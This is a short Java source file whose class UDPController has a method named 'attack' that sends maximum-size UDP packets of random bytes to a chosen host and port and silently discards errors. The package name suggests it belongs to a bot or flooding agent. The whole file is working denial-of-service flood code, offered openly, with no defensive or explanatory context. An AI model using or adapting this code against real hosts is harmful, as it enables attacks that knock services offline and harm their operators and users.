package org.anywhere.agent.controller.impl;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.NoSuchElementException;
import java.util.Random;
import java.util.concurrent.ConcurrentLinkedQueue;

public class UDPController {

    public void attack(final String host, final int port, final ConcurrentLinkedQueue<Object> requests, final Random random) {
        try {
            final DatagramSocket datagramSocket = new DatagramSocket();
            final byte[] buffer = new byte[65507];
            random.nextBytes(buffer);
            datagramSocket.setSoTimeout(13000);
            datagramSocket.send(new DatagramPacket(buffer, buffer.length, InetAddress.getByName(host), port));
            requests.add(datagramSocket);
        } catch (final NoSuchElementException | IOException ignored) {
        }
    }
}
